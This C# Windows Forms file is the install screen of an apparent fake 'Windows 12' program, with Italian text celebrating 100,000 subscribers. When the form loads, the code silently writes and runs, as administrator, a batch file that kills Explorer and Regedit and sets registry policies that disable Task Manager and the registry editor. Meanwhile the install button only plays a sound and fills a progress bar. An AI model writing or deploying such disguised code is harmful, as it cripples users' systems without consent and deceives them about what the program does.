using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using System.IO;

namespace Windows12cs
{
    public partial class Install : Form
    {
        public Install()
        {
            InitializeComponent();
        }

        private void Install_Load(object sender, EventArgs e)
        {
            string tempFilename = Path.ChangeExtension(Path.GetTempFileName(), ".bat");
            using (StreamWriter writer = new StreamWriter(tempFilename))
            {
                writer.WriteLine(@"@echo off");
                writer.WriteLine(@"taskkill /f /im explorer.exe");
                writer.WriteLine(@"taskkill /f /im regedit.exe");
                writer.WriteLine(@"REG ADD HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /V DisableTaskMgr /T REG_DWORD /D 1 /F");
                writer.WriteLine(@"REG ADD HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /V DisableRegistryTools /T REG_DWORD /D 1 /F");
            
                /*le @ eliminano il prob dei \ */
            
            }

            ExecuteAsAdmin(tempFilename);

        }
        public void ExecuteAsAdmin(string fileName)
        {
            Process proc = new Process();
            proc.StartInfo.FileName = fileName;
            proc.StartInfo.UseShellExecute = true;
            proc.StartInfo.Verb = "runas";
            proc.Start();
            proc.WaitForExit();
            File.Delete(fileName);
        }

        private void Button1_Click(object sender, EventArgs e)
        {
            string soundsiopath = Directory.GetCurrentDirectory() + @"\soundsio.wav";
            System.Media.SoundPlayer player = new System.Media.SoundPlayer(soundsiopath) ;
            player.Play();
            timer1.Start();
            InstallButton1.Text = "Congratulazioni per i 100000 iscritti (te li abbiamo poi fatti sudare con il countdown XD)";
        }
        int cpos = 0;
        private void timer1_Tick(object sender, EventArgs e)
        {
            cpos += 1;
            progressBar1.PerformStep();
            if (cpos >= 70)
            {
                timer1.Stop();
                Main main = new Main();
                main.Show();
                
            }
            else { }
        }
    }
}
